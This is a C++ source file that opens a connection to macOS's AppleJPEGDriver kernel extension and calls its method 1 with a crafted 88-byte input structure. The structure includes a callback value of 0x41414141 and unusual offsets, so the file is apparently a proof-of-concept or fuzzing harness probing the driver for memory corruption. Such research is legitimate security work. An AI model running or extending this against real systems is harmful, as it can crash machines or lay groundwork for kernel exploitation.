// Compile command:
// clang++ -framework IOKit -framework CoreFoundation -framework IOSurface AppleJPEGDriver_method_1.cpp -o AppleJPEGDriver_method_1

#include <IOKit/IOKitLib.h>
#include <IOSurface/IOSurface.h>
#include <CoreVideo/CVPixelBuffer.h>
#include <stdio.h>
#include <string.h>

/**
 * Creates an IOSurface with JPEG format specifications
 * IOSurface is a memory buffer that can be shared between processes and hardware
 * 
 * @details This function sets up an IOSurface with specific parameters:
 * - 32x32 pixel dimensions
 * - 0x10000 bytes allocation size
 * - JPEG format specification
 * - Global sharing enabled
 * 
 * @return The unique identifier of the created surface, or 0 on failure
 */
static uint32_t create_surface(void) {
    // Create a mutable dictionary to hold surface properties
    CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL, 0, 
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    
    if (!dict) return 0;
    
    // Define surface parameters
    int width = 32;
    int height = 32;
    int alloc_size = 0x10000;
    int format = 'JPEG';  // Using JPEG format identifier
    
    // Set surface as globally accessible
    CFDictionarySetValue(dict, CFSTR("IOSurfaceIsGlobal"), kCFBooleanTrue);
    
    // Create CF numbers for surface properties
    CFNumberRef w = CFNumberCreate(NULL, kCFNumberSInt32Type, &width);
    CFNumberRef h = CFNumberCreate(NULL, kCFNumberSInt32Type, &height);
    CFNumberRef s = CFNumberCreate(NULL, kCFNumberSInt32Type, &alloc_size);
    CFNumberRef f = CFNumberCreate(NULL, kCFNumberSInt32Type, &format);
    
    // Set surface properties in dictionary
    CFDictionarySetValue(dict, CFSTR("IOSurfaceWidth"), w);
    CFDictionarySetValue(dict, CFSTR("IOSurfaceHeight"), h);
    CFDictionarySetValue(dict, CFSTR("IOSurfaceAllocSize"), s);
    CFDictionarySetValue(dict, CFSTR("IOSurfacePixelFormat"), f);
    
    // Create the surface with our specifications
    IOSurfaceRef surface = IOSurfaceCreate(dict);
    if (!surface) {
        CFRelease(w); CFRelease(h); CFRelease(s); CFRelease(f); CFRelease(dict);
        return 0;
    }
    
    // Get surface ID and retain the surface
    uint32_t id = IOSurfaceGetID(surface);
    CFRetain(surface);
    
    // Clean up allocated resources
    CFRelease(w); CFRelease(h); CFRelease(s); CFRelease(f); CFRelease(dict);
    return id;
}

/**
 * Input structure for the AppleJPEGDriver
 * This structure defines the parameters needed for JPEG processing operations
 * 
 * @note Structure must be exactly 88 bytes (0x58) in size
 * @note Fields marked as reserved should not be modified
 */
struct AppleJPEGDriverIOStruct {
    uint32_t src_surface;     // Source surface ID
    uint32_t input_size;      // Size of input data
    uint32_t dst_surface;     // Destination surface ID
    uint32_t output_size;     // Size of output buffer
    uint32_t reserved1[2];    // Reserved fields (previously input/output length)
    uint32_t pixelX;          // X dimension in pixels
    uint32_t pixelY;          // Y dimension in pixels
    uint32_t reserved2;       // Reserved field
    uint32_t xOffset;         // X offset for processing
    uint32_t yOffset;         // Y offset for processing
    uint32_t subsampling;     // Subsampling mode (must be 0-4)
    uint32_t callback;        // Callback address
    uint32_t reserved3[3];    // Reserved fields
    uint32_t value100;        // Value set to 100
    uint32_t reserved4[2];    // Reserved fields
    uint32_t decodeWidth;     // Width for decoding
    uint32_t decodeHeight;    // Height for decoding
    uint32_t reserved5;       // Reserved field
} __attribute__((packed));

int main() {
    // Create source and destination surfaces
    uint32_t src = create_surface();
    uint32_t dst = create_surface();
    
    // Connect to the AppleJPEGDriver
    io_connect_t conn;
    io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault, 
        IOServiceMatching("AppleJPEGDriver"));
    if (!service) {
        printf("Driver not found\n");
        return 1;
    }

    // Open a connection to the driver
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 1, &conn);
    if (kr != KERN_SUCCESS) {
        printf("Open failed: %x\n", kr);
        return 1;
    }

    // Initialize driver input structure
    struct AppleJPEGDriverIOStruct input = {};
    memset(&input, 0, sizeof(input));

    // Configure input parameters
    input.src_surface = src;
    input.input_size = 2000;
    input.dst_surface = dst;
    input.output_size = 0x1000;
    input.pixelX = 100;
    input.pixelY = 3;
    input.xOffset = 0xd;
    input.yOffset = 0xff;
    input.subsampling = 0;
    input.callback = 0x41414141;
    input.value100 = 100;
    input.decodeWidth = 5;
    input.decodeHeight = 10;

    // Verify structure size and print configuration
    printf("Structure size: %zu (should be 88)\n", sizeof(input));
    printf("Surface IDs: src=0x%x dst=0x%x\n", src, dst);
    printf("Input params:\n"
           "  sizes: %u/%u\n"
           "  pixels: %u/%u\n"
           "  decode: %u/%u\n"
           "  offset: %u/%u\n",
           input.input_size, input.output_size,
           input.pixelX, input.pixelY,
           input.decodeWidth, input.decodeHeight,
           input.xOffset, input.yOffset);

    // Prepare output buffer and call driver
    char output[88] = {0};
    size_t output_size = sizeof(output);
    // Call IOKit method #1 on the connection, passing input/output buffers
    // kr: stores kernel return code (KERN_SUCCESS = 0 on success)
    // conn: connection to IOKit driver/service
    // 1: selector/method number to call
    // &input: pointer to input structure 
    // sizeof(input): size of input buffer in bytes
    // output: buffer to receive output data
    // &output_size: pointer to size of output buffer (updated with actual bytes written)
    kr = IOConnectCallStructMethod(conn, 1, &input, sizeof(input), output, &output_size);
   
    // Print result and clean up
    printf("Result: 0x%x (%s)\n", kr, mach_error_string(kr));
    
    IOServiceClose(conn);
    IOObjectRelease(service);
    return 0;
}